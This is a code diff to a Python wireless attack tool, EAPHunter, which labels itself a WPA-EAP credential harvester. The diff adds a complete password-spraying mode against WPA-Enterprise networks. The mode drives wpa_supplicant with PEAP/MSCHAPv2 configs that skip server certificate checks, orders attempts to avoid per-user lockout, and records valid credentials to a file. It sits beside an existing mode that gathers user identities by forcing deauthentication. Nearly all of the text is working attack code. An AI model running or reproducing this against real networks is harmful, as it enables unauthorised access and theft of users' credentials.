@@ -724,6 +724,15 @@ class EAPHunter:
     # ── Entry point ──────────────────────────────────────────────────────────
 
     def run(self):
+        print(
+            "\n  [!] userenum effectiveness depends on two conditions:\n"
+            "      1. PMKID caching is disabled or has a short TTL on the AP —\n"
+            "         cached PMKIDs allow clients to skip the full EAP exchange\n"
+            "         on reconnect, meaning no identity will be transmitted.\n"
+            "      2. Clients are not using anonymous outer identities\n"
+            "         (e.g. 'anonymous@domain') — the outer identity is all\n"
+            "         that is visible; inner credentials remain encrypted.\n"
+        )
         try:
             _require_scapy()
             self._check_deps()
@@ -1174,44 +1183,251 @@ class EAPHunter:
 
 # ── Helpers ───────────────────────────────────────────────────────────────────
 def _sorted_clients(table: dict) -> list[dict]:
-    """Most recently active clients first."""
     return sorted(table.values(), key=lambda c: c["last_seen"], reverse=True)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+class EAPSprayer:
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+    def __init__(self, essid: str, iface: str, users: list[str],
+                 passwords: list[str], out_dir: str, delay: float):
+        self.essid     = essid
+        self.iface     = iface
+        self.users     = users
+        self.passwords = passwords
+        self.out_dir   = Path(out_dir)
+        self.delay     = delay
+        self.hits: list[tuple[str, str]] = []
+        self._tmp = Path(tempfile.mkdtemp(prefix="eaphunter_spray_"))
+
+    def run(self):
+        if not shutil.which("wpa_supplicant"):
+            die("wpa_supplicant not found — required for spray mode")
+
+        # Ordered spray: all users per password (minimises per-user lockout)
+        combos = [(u, p) for p in self.passwords for u in self.users]
+        total  = len(combos)
+        width  = len(str(total))
+
+        section(f"Password Spray  —  {self.essid}  ({total} attempt{'s' if total != 1 else ''})")
+
+        self._set_managed()
+        self._kill_wpa_supplicant()
+
+        try:
+            for i, (user, pwd) in enumerate(combos, 1):
+                label = f"  [{i:0{width}d}/{total}]  {user:<30}  {pwd}"
+                print(f"\r{label}  ", end="", flush=True)
+
+                success = self._attempt(user, pwd)
+
+                if success:
+                    print(f"\r{label}  ->  VALID  <---")
+                    ok(f"Valid credential: {user}:{pwd}")
+                    self.hits.append((user, pwd))
+                    self._append_unique(self.out_dir / "spray_hits.txt",
+                                        f"{user}:{pwd}")
+                else:
+                    print(f"\r{label}  ->  failed")
+
+                if self.delay > 0 and i < total:
+                    time.sleep(self.delay)
+        finally:
+            shutil.rmtree(self._tmp, ignore_errors=True)
+
+        section("Spray Results")
+        if self.hits:
+            ok(f"{len(self.hits)} valid credential(s):")
+            for user, pwd in self.hits:
+                print(f"    {user}:{pwd}")
+        else:
+            warn("No valid credentials found.")
+
+    # ── Single attempt via wpa_supplicant ────────────────────────────────────
+
+    def _attempt(self, username: str, password: str) -> bool:
+        # Remove stale control socket so wpa_supplicant can start cleanly
+        stale = Path(f"/var/run/wpa_supplicant/{self.iface}")
+        stale.unlink(missing_ok=True)
+
+        config_path = self._tmp / "wpa.conf"
+        config_path.write_text(self._make_config(username, password))
+
+        proc = subprocess.Popen(
+            ["wpa_supplicant", "-D", "nl80211",
+             "-i", self.iface, "-c", str(config_path)],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+        )
+
+        success  = False
+        deadline = time.time() + 16
+        buf      = b""
+
+        try:
+            while time.time() < deadline:
+                remaining = deadline - time.time()
+                ready, _, _ = _select.select(
+                    [proc.stdout], [], [], min(remaining, 0.5)
+                )
+                if not ready:
+                    continue
+                try:
+                    chunk = os.read(proc.stdout.fileno(), 4096)
+                except OSError:
+                    break
+                if not chunk:
+                    break
+                buf += chunk
+                if b"CTRL-EVENT-CONNECTED" in buf:
+                    success = True
+                    break
+                if (b"CTRL-EVENT-AUTH-FAILED"       in buf or
+                        b"CTRL-EVENT-SSID-TEMP-DISABLED" in buf or
+                        b"EAP: Status notification: failure" in buf or
+                        b"Authentication failed"          in buf):
+                    break
+        finally:
+            proc.terminate()
+            try:
+                proc.wait(timeout=3)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait()
+
+        return success
+
+    # ── wpa_supplicant config (PEAP / MSCHAPv2, server cert not verified) ────
+
+    def _make_config(self, username: str, password: str) -> str:
+        # Only escape double-quotes; backslash (DOMAIN\user) must pass through as-is
+        u = username.replace('"', '\\"')
+        p = password.replace('"', '\\"')
+        return (
+            'ctrl_interface=/var/run/wpa_supplicant\n'
+            'ctrl_interface_group=0\n'
+            f'network={{\n'
+            f'    ssid="{self.essid}"\n'
+            f'    scan_ssid=1\n'
+            f'    key_mgmt=WPA-EAP\n'
+            f'    eap=PEAP\n'
+            f'    identity="{u}"\n'
+            f'    password="{p}"\n'
+            f'    phase1="peaplabel=0"\n'
+            f'    phase2="auth=MSCHAPV2"\n'
+            f'}}\n'
+        )
+
+    # ── Interface helpers ────────────────────────────────────────────────────
+
+    def _set_managed(self):
+        for cmd in (
+            ["ip",  "link", "set", self.iface, "down"],
+            ["iw",  "dev",  self.iface, "set", "type", "managed"],
+            ["ip",  "link", "set", self.iface, "up"],
+        ):
+            subprocess.run(cmd, capture_output=True)
+
+    @staticmethod
+    def _kill_wpa_supplicant():
+        for pid_dir in Path("/proc").iterdir():
+            if not pid_dir.name.isdigit():
+                continue
+            try:
+                comm = (pid_dir / "comm").read_text().strip()
+                if comm == "wpa_supplicant":
+                    os.kill(int(pid_dir.name), signal.SIGTERM)
+            except Exception:
+                pass
+
+    @staticmethod
+    def _append_unique(path: Path, value: str):
+        existing = set(path.read_text().splitlines()) if path.exists() else set()
+        if value not in existing:
+            with open(path, "a") as f:
+                f.write(value + "\n")
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _load_lines(path: str) -> list[str]:
+    return [l.strip() for l in Path(path).read_text().splitlines()
+            if l.strip() and not l.startswith("#")]
+
+
 def main():
     print("EAPHunter  —  WPA-EAP Credential Harvester\n")
+
     ap = argparse.ArgumentParser(
         description="WPA-EAP Credential Harvester",
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog=(
-            "examples:\n"
-            "  sudo python3 eaphunter.py -e CORP-WIFI -i wlan0\n"
-            "  sudo python3 eaphunter.py -e CORP-WIFI -i wlan0 -c 30 -o ./results\n"
-        )
     )
-    ap.add_argument("-e", "--essid",     required=True, help="Target SSID")
-    ap.add_argument("-i", "--interface", required=True, help="Wireless interface (e.g. wlan0)")
-    ap.add_argument("-o", "--output",    default=None,  help="Output directory (auto-named)")
-    ap.add_argument("-c", "--capture",   type=int, default=20,
-                    help="Seconds to capture after deauth (default: 20)")
+    sub = ap.add_subparsers(dest="mode", required=True)
+
+    # ── userenum ─────────────────────────────────────────────────────────────
+    ue = sub.add_parser("userenum",
+                        help="Harvest EAP outer identities via deauth")
+    ue.add_argument("-e", "--essid",     required=True, help="Target SSID")
+    ue.add_argument("-i", "--interface", required=True, help="Wireless interface")
+    ue.add_argument("-c", "--capture",   type=int, default=20,
+                    help="Capture window in seconds after deauth (default: 20)")
+    ue.add_argument("-o", "--output",    default=None, help="Output directory")
+
+    # ── spray ─────────────────────────────────────────────────────────────────
+    sp = sub.add_parser("spray",
+                        help="Password spray against WPA-Enterprise")
+    sp.add_argument("-e", "--essid",     required=True, help="Target SSID")
+    sp.add_argument("-i", "--interface", required=True, help="Wireless interface")
+    sp.add_argument("-u", "--user",      default=None,  help="Single username")
+    sp.add_argument("-U", "--userfile",  default=None,  help="File of usernames")
+    sp.add_argument("-p", "--password",  default=None,  help="Single password")
+    sp.add_argument("-P", "--passfile",  default=None,  help="File of passwords")
+    sp.add_argument("-d", "--delay",     type=float, default=0,
+                    help="Seconds between attempts (default: 0)")
+    sp.add_argument("-o", "--output",    default=None, help="Output directory")
+
     args = ap.parse_args()
 
     if os.geteuid() != 0:
         die(f"Must run as root.  Try: sudo python3 {sys.argv[0]} {' '.join(sys.argv[1:])}")
 
-    out_dir = args.output or f"./eaphunter_{args.essid.replace(' ', '_')}_{time.strftime('%Y%m%d_%H%M%S')}"
+    ts      = time.strftime("%Y%m%d_%H%M%S")
+    out_dir = args.output or f"./eaphunter_{args.essid.replace(' ', '_')}_{ts}"
     Path(out_dir).mkdir(parents=True, exist_ok=True)
 
-    hunter = EAPHunter(essid=args.essid, iface=args.interface,
-                       out_dir=out_dir, capture_time=args.capture)
+    if args.mode == "userenum":
+        hunter = EAPHunter(essid=args.essid, iface=args.interface,
+                           out_dir=out_dir, capture_time=args.capture)
 
-    def _sig(_s, _f):
-        hunter._cleanup(); sys.exit(0)
-    signal.signal(signal.SIGINT,  _sig)
-    signal.signal(signal.SIGTERM, _sig)
+        def _sig(_s, _f):
+            hunter._cleanup(); sys.exit(0)
+        signal.signal(signal.SIGINT,  _sig)
+        signal.signal(signal.SIGTERM, _sig)
+        hunter.run()
 
-    hunter.run()
+    elif args.mode == "spray":
+        users     = []
+        passwords = []
+
+        if args.user:
+            users.append(args.user)
+        if args.userfile:
+            users.extend(_load_lines(args.userfile))
+        if args.password:
+            passwords.append(args.password)
+        if args.passfile:
+            passwords.extend(_load_lines(args.passfile))
+
+        if not users:
+            die("Provide at least one username: -u or -U")
+        if not passwords:
+            die("Provide at least one password: -p or -P")
+
+        sprayer = EAPSprayer(essid=args.essid, iface=args.interface,
+                             users=users, passwords=passwords,
+                             out_dir=out_dir, delay=args.delay)
+        signal.signal(signal.SIGINT,  lambda _s, _f: sys.exit(0))
+        signal.signal(signal.SIGTERM, lambda _s, _f: sys.exit(0))
+        sprayer.run()
 
 
 if __name__ == "__main__":
